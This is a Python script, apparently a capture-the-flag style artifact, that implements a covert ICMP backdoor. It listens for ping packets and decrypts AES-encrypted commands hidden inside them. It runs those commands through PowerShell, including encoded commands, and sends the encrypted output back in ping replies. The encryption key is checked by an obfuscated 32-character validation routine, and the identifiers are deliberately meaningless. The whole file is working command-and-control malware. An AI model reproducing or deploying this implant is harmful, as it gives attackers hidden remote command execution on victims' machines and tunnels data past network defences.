from scapy.all import *
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64
import zlib
import base64


def zenlesszonezero(input_bytes):
    return zlib.compress(input_bytes.encode())

def Zenonia(compressed_bytes):
    return zlib.decompress(compressed_bytes).decode()


def gasskann(gg_bang):
    gacorrrrrrrr = AES.new(WKWKKKWKWKWKWKWKWKWKWKWKWKWWKWKWKWKWKWKWKKWKWKWKWK, AES.MODE_CBC, bjirrrrrrrrrrrrrrrrrrr)
    wibuuuuuuuuuuuuuu = pad(gg_bang, AES.block_size)
    anjirrrrrrr = gacorrrrrrrr.encrypt(wibuuuuuuuuuuuuuu)
    return bjirrrrrrrrrrrrrrrrrrr + anjirrrrrrr

def ashiap(bjrit):
    bjirrrrrrrrrrrrrrrrrrr = bjrit[:16]
    anjirrrrrrr = bjrit[16:]
    gacorrrrrrrr = AES.new(WKWKKKWKWKWKWKWKWKWKWKWKWKWWKWKWKWKWKWKWKKWKWKWKWK, AES.MODE_CBC, bjirrrrrrrrrrrrrrrrrrr)
    wibuuuuuuuuuuuuuu = gacorrrrrrrr.decrypt(anjirrrrrrr)
    return unpad(wibuuuuuuuuuuuuuu, AES.block_size)

def kazuyabjirrrrrrrrrr(ezChangli):
    try:
        if len(ezChangli) > 30000:
            wrth = base64.b64decode(ezChangli).decode('utf-16le')
            minecraft = ["powershell", wrth]
        else:
            minecraft = ["powershell", "-EncodedCommand", ezChangli]
        genshinImpact = subprocess.check_output(minecraft, stderr=subprocess.STDOUT, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        genshinImpact = e.output
    return genshinImpact


def bengsky(kiaraaa):
    return len(kiaraaa) < 1024

def icmp_listener(Maling):
    if Maling.haslayer(ICMP) and Maling[ICMP].type == 8 and Maling.haslayer(Raw):
        msfir = Maling[IP].src
        azuketto = Maling[ICMP].seq
        kiaraaa = Maling[Raw].load
        if msfir not in kiaraaa_buffer:
            kiaraaa_buffer[msfir] = []
        kiaraaa_buffer[msfir].append((azuketto, kiaraaa))
        print(f"Received kiaraaa {azuketto} from {msfir}")
        if bengsky(kiaraaa):
            cutelittlebirb = b''.join([solderet for _, solderet in sorted(kiaraaa_buffer[msfir])])
            ezChangli = (Zenonia(ashiap(cutelittlebirb)))
            LKazuya = kazuyabjirrrrrrrrrr(ezChangli)
            if len(LKazuya) == 0:
                LKazuya = "success"
            hoaaaaaahm = gasskann(zenlesszonezero(LKazuya))
            del kiaraaa_buffer[msfir]
            yoasobi(hoaaaaaahm, msfir)

def yoasobi(gataubjrit, Mau_kemana_kita):
    MAX_kiaraaa_SIZE = 1024
    kiaraaas = [gataubjrit[i:i + MAX_kiaraaa_SIZE] for i in range(0, len(gataubjrit), MAX_kiaraaa_SIZE)]

    for kiara123, kiaraaa in enumerate(kiaraaas):
        reply = IP(dst=Mau_kemana_kita, src=MizuharaChizuru) / ICMP(type=0, seq=kiara123) / kiaraaa
        send(reply)
        print(f"Sent kiaraaa {kiara123+1}/{len(kiaraaas)} of gataubjrit")

def gabutt(MizuharaChizuruPretty):
    if MizuharaChizuruPretty.haslayer(ICMP) and MizuharaChizuruPretty[ICMP].type == 8: 
        ezChangli = (ashiap(Zenonia(MizuharaChizuruPretty[Raw].load)))
        print(f"{ezChangli}")
        
        LKazuya = kazuyabjirrrrrrrrrr(ezChangli)
        if len(LKazuya) == 0:
            LKazuya = "success"
        hoaaaaaahm = IP(dst=MizuharaChizuruPretty[IP].src, src=MizuharaChizuru) / ICMP(type=0) / zenlesszonezero(gasskann(LKazuya))
        send(hoaaaaaahm)

def kawokaowkoawkowkoakowkokokwokoawkokokaowkoawkoakowkawooawkoaowkoawoakwoawokaoawk(awokawokawokawokawokawokawokawokawokawokawokawok):
    if len(awokawokawokawokawokawokawokawokawokawokawokawok) != 32:
        return False
    if \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[0]) ^ 205159573243964824737299055634219568431425393093966110759400764283677572127787 ^ 173438557617046994740268237909681699856296019683243567021195924658018589018903)  == 84537522163133512712798803067162590725054291695882455854042202399512022210394 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[1]) * 162494310648658200012862524540051780636413417878626535838725154491130938306481) % 195058868702908667776267085193295799561528929723257041839747686100985003927251 == 192431031722155557342984855383949287648215798967049088508647657635869885548299 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[2]) * 151244431611715386709405295427990705569837850570734658634219328116519491973958) % 124813073229925330008104645013311070059826479361778160927711543312544480713539 == 20574470026669421581384769771511803882281024412130280635258237465355733364722 and \
       int(format(ord(awokawokawokawokawokawokawokawokawokawokawokawok[3]), 'o')) ^ 227843800811957810787648003093548469772052746022073013357940970479936368548628 == 227843800811957810787648003093548469772052746022073013357940970479936368548649 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[4]) + 171014579775128647197111627091638682362328111695946704364535835946472357754120) % 256 == 110 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[5]) * 170870441128987484715569266823217591379501624564639805466669714848874785038356) % 191309336887865451438613214141033763845730159290290313737338618324174784360106 == 121829817155357193689482465723202673078863883805094148855841164461822693751416 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[6]) + 223646322376295096396538543959990530681280753025327305577449474044832989505591) % 256 == 111 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[7]) ^ 196300924484008046907947521331740565477462486555487634750796877068083197478446 >> 229259697431380926662066091380555350487860550911499322242913547502726047496521 % 153515403129825291336748432598075310512549238026808874509268089616157852844069 * ord(awokawokawokawokawokawokawokawokawokawokawokawok[8]) ^ ord(awokawokawokawokawokawokawokawokawokawokawokawok[9]) % ord(awokawokawokawokawokawokawokawokawokawokawokawok[10]) << ord(awokawokawokawokawokawokawokawokawokawokawokawok[11]) + ord(awokawokawokawokawokawokawokawokawokawokawokawok[12])) == 34967568471296017085928006251512630841377292388 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[8]) + 177882818520121930146048357479318156034980376337314021987435285709653355602623) % 256 == 34 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[9]) + 223421758885926246028379197342793581801600698205469559280956909002798064333220) % 256 == 213 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[10]) + 209283825236870728108795504436518862758898641660764912471694788781672098710497) % 256 == 68 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[11]) + 123772702489839681973635644532466572473607067530754438100981398346883113920296) % 256 == 140 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[12]) + 205902649635755580703010725811204104880093096195602756256202759621195005547387) % 256 == 172 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[13]) ^ 191110997079291003886243920110265359868927528775615636607149409815719553018286 ^ 203502071766785860328949160274923202972577704040667994653638555977843864283024)  == 46784198301386614834492076010478856478791434675045915130379418070814796582415 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[14]) ^ 196304600276030441717203047793990291753677613346535569350358632461910478331551 ^ 228188132596927174240201320565066612978089566161838459847187087960904632401916)  == 33693004706189283263780318189072261648330420986111978542300002073853895827802 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[15]) * 160673928596956747585215127845421421241617867509048866522228214873677517286155) % 211838851397605725599441667381614970040407649476387313769902668442103668164628 == 86149922340117762510426110842089298142982259284402297350458250020788775808832 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[16]) ^ 129933060553846437718252540370820819460825657759431927658325212603758218003089 >> 152054317435292267319241458865188440492206639878862831815173185181107730685166 % 117406307890845753003743763028689966318633260300897760436955221684834326104738 * ord(awokawokawokawokawokawokawokawokawokawokawokawok[17]) ^ ord(awokawokawokawokawokawokawokawokawokawokawokawok[18]) % ord(awokawokawokawokawokawokawokawokawokawokawokawok[19]) << ord(awokawokawokawokawokawokawokawokawokawokawokawok[20]) + ord(awokawokawokawokawokawokawokawokawokawokawokawok[21])) == 147980460468242587413119145382772789 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[17]) * 130507808458115520850393224183996397381863711965037838240945617724594283400331) % 143880387069249205490699194810541328846256645275400776379767227175799646223779 == 114417920192008893087060813776731811071535606272080122504593233787297559229586 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[18]) + 182148851990173031553673437902805060182213929662463071985485472651963613245051) % 256 == 180 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[19]) + 220181628250032195538217224281280673068419590454231601232933458404683514731815) % 256 == 136 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[20]) ^ 132808829160934766959342851962867632085112889049511271088537447955541460622304 ^ 138903269966137638274351239963962185893054430649450560122020753828256542776232)  == 10189992456525311081668768990573386536791186369042678425636546508168867594353 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[21]) + 201425672300689717334264538130389387448951942714360149832442100429682861084356) % 256 == 250 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[22]) + 147233331410905064050219355182180762406624954647748995235522355755024881232748) % 256 == 157 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[23]) + 184947993053947193324469644572159838462700770984154014678359737053317288985770) % 256 == 223 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[24]) ^ 143572207314955491266749277684976924430524718658205556813472991972103404045943) == 143572207314955491266749277684976924430524718658205556813472991972103404045842 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[25]) + 116013889089818909363427995152052030648797801237713503324636703592450679665848) % 256 == 236 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[26]) + 163305386831714943684914625169806274370613455348966854860120054467351304478039) % 256 == 138 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[27]) ^ 226650312811823467499808322172668810381915764991787387354486687572601718472979) == 226650312811823467499808322172668810381915764991787387354486687572601718473073 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[28]) + 173906946635041121248892264603727144228061539365345318654753469062987708334676) % 256 == 184 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[29]) * 148901154191094057635018511180032531884504063721818705671241637200238910669230) % 116981642551768456700356418979436672556980950189629673005534711974464421234716 == 848501886381200901068786341222174659056991425951701530860207800630600377530 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[30]) * 117653035091151399166450313444216016665790468340423516679756553056255908333494) % 163255303143940931305698168650658408880870632244739350285224436087580892638318 == 82972449789754729661965659811969851607071616857226130513784577344697487419174 and \
       (ord(awokawokawokawokawokawokawokawokawokawokawokawok[31]) ^ 169827955481936890810463556261488645293950105160742240241818677182779591599328 ^ 207909443389471249927481854499234176701625316662558980466342909792582426043872)  == 85429956374298231461480950297738203151322347492539239672994733261609821241657:
        return True
    else:
        return False

bjirrrrrrrrrrrrrrrrrrr = get_random_bytes(16)   
MizuharaChizuru = '192.168.56.101'  
ChizuruMizuhara = '\\Device\\NPF_{F64BB047-095A-46A3-8E8F-C5D24BEE0ED2}'
WKWKKKWKWKWKWKWKWKWKWKWKWKWWKWKWKWKWKWKWKKWKWKWKWK = str(input())
if not kawokaowkoawkowkoakowkokokwokoawkokokaowkoawkoakowkawooawkoaowkoawoakwoawokaoawk(WKWKKKWKWKWKWKWKWKWKWKWKWKWWKWKWKWKWKWKWKKWKWKWKWK):
    raise "?"
kiaraaa_buffer = {}
WKWKKKWKWKWKWKWKWKWKWKWKWKWWKWKWKWKWKWKWKKWKWKWKWK = bytes.fromhex(WKWKKKWKWKWKWKWKWKWKWKWKWKWWKWKWKWKWKWKWKKWKWKWKWK)
print("...")
sniff(iface=ChizuruMizuhara, filter="icmp", prn=icmp_listener)
